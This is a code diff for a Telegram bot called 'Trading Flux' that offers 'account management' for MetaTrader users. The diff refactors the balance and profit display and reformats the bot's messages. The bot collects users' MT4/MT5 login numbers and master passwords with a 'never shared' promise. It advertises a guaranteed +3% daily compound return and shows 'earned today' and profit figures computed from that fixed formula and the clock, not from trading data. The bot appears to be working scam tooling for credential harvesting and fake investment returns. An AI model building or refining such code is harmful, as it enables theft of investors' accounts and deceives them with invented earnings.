@@ -26,6 +26,26 @@ async function getAccountData(userId: number): Promise<AccountData | null> {
   };
 }
 
+/** Effective start date for a user — adjustedDate if set, else startDate */
+function effectiveStart(account: AccountData): Date {
+  if (account.adjustedBalance != null && account.adjustedDate) {
+    return account.adjustedDate instanceof Date
+      ? account.adjustedDate
+      : new Date(account.adjustedDate as unknown as string);
+  }
+  return account.startDate;
+}
+
+/** Profit base — adjustedBalance if set, else original deposit */
+function profitBase(account: AccountData): number {
+  return account.adjustedBalance ?? account.deposit;
+}
+
+/** Fraction of today elapsed based on real clock (0–1) */
+function todayFraction(now: Date): number {
+  return (now.getHours() * 3600 + now.getMinutes() * 60 + now.getSeconds()) / 86400;
+}
+
 const LOGO = `
 ┌─────────────────────────┐
 │    📊  TRADING FLUX      │
@@ -65,12 +85,10 @@ async function sendMainMenu(ctx: Context, firstName?: string) {
       const now = new Date();
       const currentBalance = computeCurrentBalance(account, now);
       const todayDailyEarning = currentBalance * 0.03;
-      const minuteOfDay = now.getHours() * 60 + now.getMinutes();
-      const earnedToday = todayDailyEarning * (minuteOfDay / 1440);
-
-      // Profit base: adjustedBalance if set, otherwise original deposit
-      const profitBase = account.adjustedBalance != null ? account.adjustedBalance : account.deposit;
-      const totalProfit = currentBalance - profitBase;
+      // Use real seconds-based fraction, consistent with balance dashboard
+      const earnedToday = todayDailyEarning * todayFraction(now);
+      const base = profitBase(account);
+      const totalProfit = currentBalance - base;
 
       balanceLine =
         `\n┌─────────────────────────┐\n` +
@@ -109,14 +127,22 @@ export function registerFormHandlers(bot: Bot<Context>): void {
       `*Commands:*\n▸ /start — Main menu\n▸ /register — Submit account\n▸ /cancel — Exit current form\n▸ /help — This menu\n\n` +
       `*How Account Management Works:*\n① Submit your MT4/MT5 credentials\n② Our team reviews within 24 hours\n③ We activate your account\n④ Your balance grows +3%/day\n\n` +
       `${"─".repeat(28)}\n💡 Tip: Use the buttons for the best experience.`,
-      { parse_mode: "Markdown", reply_markup: new InlineKeyboard().text("📝 Register Now", "menu_register").row().text("🏠 Main Menu", "menu_main") }
+      {
+        parse_mode: "Markdown",
+        reply_markup: new InlineKeyboard()
+          .text("📝 Register Now", "menu_register").row()
+          .text("🏠 Main Menu", "menu_main"),
+      }
     );
   });
 
   bot.command("cancel", async (ctx) => {
     await resetSession(ctx.from!.id);
     await clearSupportStep(ctx.from!.id);
-    await ctx.reply(`✅ *Form cancelled.*\n\nReturning you to the main menu.`, { parse_mode: "Markdown", reply_markup: mainMenuKeyboard() });
+    await ctx.reply(`✅ *Form cancelled.*\n\nReturning you to the main menu.`, {
+      parse_mode: "Markdown",
+      reply_markup: mainMenuKeyboard(),
+    });
   });
 
   bot.command("register", async (ctx) => {
@@ -154,7 +180,12 @@ export function registerFormHandlers(bot: Bot<Context>): void {
       `*Step 4 — Daily Growth*\nYour balance grows at +3% per day using compound interest.\n\n` +
       `*Step 5 — Daily Updates*\nYou'll receive regular updates on your account performance.\n\n` +
       `${"─".repeat(28)}\n💰 *Example: $1,000 deposit*\n  Day 7:   \\$1,229.87\n  Day 30:  \\$2,427.26\n  Day 90:  \\$14,300.74`,
-      { parse_mode: "Markdown", reply_markup: new InlineKeyboard().text("📝 Register Now", "menu_register").row().text("🏠 Main Menu", "menu_main") }
+      {
+        parse_mode: "Markdown",
+        reply_markup: new InlineKeyboard()
+          .text("📝 Register Now", "menu_register").row()
+          .text("🏠 Main Menu", "menu_main"),
+      }
     );
   });
 
@@ -186,21 +217,27 @@ export function registerFormHandlers(bot: Bot<Context>): void {
     if (account) {
       const now = new Date();
       const msPerDay = 86_400_000;
-      const daysElapsed = Math.max(0, Math.floor((now.getTime() - account.startDate.getTime()) / msPerDay));
-      const currentBalance = computeCurrentBalance(account, now);
 
-      // Profit base: adjustedBalance if set, otherwise original deposit
-      const profitBase = account.adjustedBalance != null ? account.adjustedBalance : account.deposit;
-      const totalProfit = currentBalance - profitBase;
-      const growthPct = profitBase > 0 ? ((currentBalance - profitBase) / profitBase) * 100 : 0;
+      // Count days from adjustedDate when set — consistent with the balance dashboard
+      const start = effectiveStart(account);
+      const daysElapsed = Math.max(0, Math.floor((now.getTime() - start.getTime()) / msPerDay));
+
+      const currentBalance = computeCurrentBalance(account, now);
+      const base = profitBase(account);
+      const totalProfit = currentBalance - base;
+      const growthPct = base > 0 ? (totalProfit / base) * 100 : 0;
 
       const todayDailyEarning = currentBalance * 0.03;
-      const minuteOfDay = now.getHours() * 60 + now.getMinutes();
-      const earnedToday = todayDailyEarning * (minuteOfDay / 1440);
+      // Use real seconds-based fraction — consistent with balance dashboard
+      const earnedToday = todayDailyEarning * todayFraction(now);
 
       const profitLabel = account.adjustedBalance != null
         ? `  📈 Profit Since Update: `
         : `  📈 Total Profit:        `;
+
+      const activeLabel = account.adjustedBalance != null
+        ? `Day *${daysElapsed}* since last update  ·  +3%/day`
+        : `Active for *${daysElapsed} day${daysElapsed !== 1 ? "s" : ""}*  ·  +3%/day`;
 
       await ctx.reply(
         `*📋 Your Account Status*\n${"─".repeat(28)}\n\n` +
@@ -208,11 +245,13 @@ export function registerFormHandlers(bot: Bot<Context>): void {
         `💵 *BALANCE SUMMARY*\n\n` +
         `  💰 Current Balance:  *${formatUSD(currentBalance)}*\n` +
         `  📥 Original Deposit: *${formatUSD(account.deposit)}*\n` +
-        (account.adjustedBalance != null ? `  📌 Updated Balance:  *${formatUSD(account.adjustedBalance)}*\n` : ``) +
+        (account.adjustedBalance != null
+          ? `  📌 Updated Base:     *${formatUSD(account.adjustedBalance)}*\n`
+          : ``) +
         `${profitLabel}*+${formatUSD(totalProfit)}*\n` +
         `  🚀 Growth:           *+${growthPct.toFixed(2)}%*\n` +
         `  ✅ Earned today:     *+${formatUSD(earnedToday)}*\n\n` +
-        `${"━".repeat(28)}\n🖥️ *${account.platform ?? "—"}*\n📅 Active for *${daysElapsed} day${daysElapsed !== 1 ? "s" : ""}*  ·  +3%/day`,
+        `${"━".repeat(28)}\n🖥️ *${account.platform ?? "—"}*\n📅 ${activeLabel}`,
         {
           parse_mode: "Markdown",
           reply_markup: new InlineKeyboard()
@@ -229,7 +268,10 @@ export function registerFormHandlers(bot: Bot<Context>): void {
       await ctx.reply(
         `*📋 Your Account Status*\n${"─".repeat(28)}\n\n` +
         `📌 Status: *⏳ Under Review*\n\nYour submission is being reviewed by our team.\nYou'll be notified within 24 hours once approved.`,
-        { parse_mode: "Markdown", reply_markup: new InlineKeyboard().text("🏠 Main Menu", "menu_main") }
+        {
+          parse_mode: "Markdown",
+          reply_markup: new InlineKeyboard().text("🏠 Main Menu", "menu_main"),
+        }
       );
       return;
     }
@@ -237,14 +279,22 @@ export function registerFormHandlers(bot: Bot<Context>): void {
     await ctx.reply(
       `*📋 Your Account Status*\n${"─".repeat(28)}\n\n` +
       `📌 Status: *⚪ Not Registered Yet*\n\nComplete the registration form to submit your MT4/MT5 account for management.`,
-      { parse_mode: "Markdown", reply_markup: new InlineKeyboard().text("📝 Register Now", "menu_register").row().text("🏠 Main Menu", "menu_main") }
+      {
+        parse_mode: "Markdown",
+        reply_markup: new InlineKeyboard()
+          .text("📝 Register Now", "menu_register").row()
+          .text("🏠 Main Menu", "menu_main"),
+      }
     );
   });
 
   bot.callbackQuery("form_cancel", async (ctx) => {
     await ctx.answerCallbackQuery("Cancelled");
     await resetSession(ctx.from!.id);
-    await ctx.reply(`✅ *Form cancelled.*\n\nNo data was submitted.`, { parse_mode: "Markdown", reply_markup: mainMenuKeyboard() });
+    await ctx.reply(`✅ *Form cancelled.*\n\nNo data was submitted.`, {
+      parse_mode: "Markdown",
+      reply_markup: mainMenuKeyboard(),
+    });
   });
 
   bot.callbackQuery(/^platform_(MT4|MT5)$/, async (ctx) => {
@@ -252,7 +302,8 @@ export function registerFormHandlers(bot: Bot<Context>): void {
     const platform = ctx.match[1] as "MT4" | "MT5";
     await updateSession(ctx.from!.id, { platform, step: "account_number" });
     await ctx.reply(
-      stepHeader(2, 6, "🔢 Login / Account Number") + `\n\n✅ Platform: *${platform}*\n\nEnter your MT4/MT5 *login (account number)*:\n_The numeric ID you use to log in._`,
+      stepHeader(2, 6, "🔢 Login / Account Number") +
+      `\n\n✅ Platform: *${platform}*\n\nEnter your MT4/MT5 *login (account number)*:\n_The numeric ID you use to log in._`,
       { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
     );
   });
@@ -289,7 +340,10 @@ export function registerFormHandlers(bot: Bot<Context>): void {
   bot.callbackQuery("submit_cancel", async (ctx) => {
     await ctx.answerCallbackQuery("Cancelled");
     await resetSession(ctx.from!.id);
-    await ctx.reply(`❌ *Submission cancelled.*\n\nYour data was not saved.`, { parse_mode: "Markdown", reply_markup: mainMenuKeyboard() });
+    await ctx.reply(`❌ *Submission cancelled.*\n\nYour data was not saved.`, {
+      parse_mode: "Markdown",
+      reply_markup: mainMenuKeyboard(),
+    });
   });
 
   bot.on("message:text", async (ctx, next: NextFunction) => {
@@ -319,12 +373,16 @@ export function registerFormHandlers(bot: Bot<Context>): void {
     switch (session.step) {
       case "account_number": {
         if (!/^\d+$/.test(text)) {
-          await ctx.reply(`⚠️ *Invalid format*\n\nAccount number must contain digits only.\nPlease try again:`, { parse_mode: "Markdown", reply_markup: cancelKeyboard() });
+          await ctx.reply(
+            `⚠️ *Invalid format*\n\nAccount number must contain digits only.\nPlease try again:`,
+            { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
+          );
           return;
         }
         await updateSession(userId, { accountNumber: text, step: "password" });
         await ctx.reply(
-          stepHeader(3, 6, "🔑 Master Password") + `\n\n✅ Login: \`${text}\`\n\nEnter your account's *master password*:\n\n🔒 _Transmitted securely. Never shared with third parties._`,
+          stepHeader(3, 6, "🔑 Master Password") +
+          `\n\n✅ Login: \`${text}\`\n\nEnter your account's *master password*:\n\n🔒 _Transmitted securely. Never shared with third parties._`,
           { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
         );
         break;
@@ -332,7 +390,8 @@ export function registerFormHandlers(bot: Bot<Context>): void {
       case "password": {
         await updateSession(userId, { password: text, step: "server_name" });
         await ctx.reply(
-          stepHeader(4, 6, "🌐 Broker Server Name") + `\n\n✅ Password saved.\n\nEnter your broker's *server name*:\n\n_Found on your MT4/MT5 login screen._\n_e.g._ \`ICMarkets-Live01\``,
+          stepHeader(4, 6, "🌐 Broker Server Name") +
+          `\n\n✅ Password saved.\n\nEnter your broker's *server name*:\n\n_Found on your MT4/MT5 login screen._\n_e.g._ \`ICMarkets-Live01\``,
           { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
         );
         break;
@@ -340,7 +399,8 @@ export function registerFormHandlers(bot: Bot<Context>): void {
       case "server_name": {
         await updateSession(userId, { serverName: text, step: "deposit" });
         await ctx.reply(
-          stepHeader(5, 6, "💵 Account Balance") + `\n\n✅ Server: \`${text}\`\n\nWhat is your current account balance in *USD*?\n\n_Enter numbers only (e.g._ \`5000\`_)_`,
+          stepHeader(5, 6, "💵 Account Balance") +
+          `\n\n✅ Server: \`${text}\`\n\nWhat is your current account balance in *USD*?\n\n_Enter numbers only (e.g._ \`5000\`_)_`,
           { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
         );
         break;
@@ -348,19 +408,26 @@ export function registerFormHandlers(bot: Bot<Context>): void {
       case "deposit": {
         const amount = parseFloat(text.replace(/[^0-9.]/g, ""));
         if (isNaN(amount) || amount <= 0) {
-          await ctx.reply(`⚠️ *Invalid amount*\n\nPlease enter a valid USD amount (e.g. \`1000\`):`, { parse_mode: "Markdown", reply_markup: cancelKeyboard() });
+          await ctx.reply(
+            `⚠️ *Invalid amount*\n\nPlease enter a valid USD amount (e.g. \`1000\`):`,
+            { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
+          );
           return;
         }
         await updateSession(userId, { depositAmount: amount.toFixed(2), step: "full_name" });
         await ctx.reply(
-          stepHeader(6, 6, "👤 Full Name") + `\n\n✅ Deposit: *$${amount.toLocaleString("en-US", { minimumFractionDigits: 2 })}*\n\nEnter your *full name*:`,
+          stepHeader(6, 6, "👤 Full Name") +
+          `\n\n✅ Deposit: *$${amount.toLocaleString("en-US", { minimumFractionDigits: 2 })}*\n\nEnter your *full name*:`,
           { parse_mode: "Markdown", reply_markup: cancelKeyboard() }
         );
         break;
       }
       case "full_name": {
         if (text.length < 3) {
-          await ctx.reply(`⚠️ Please enter your full name (at least 3 characters):`, { reply_markup: cancelKeyboard() });
+          await ctx.reply(
+            `⚠️ Please enter your full name (at least 3 characters):`,
+            { reply_markup: cancelKeyboard() }
+          );
           return;
         }
         const today = new Date().toISOString().split("T")[0];
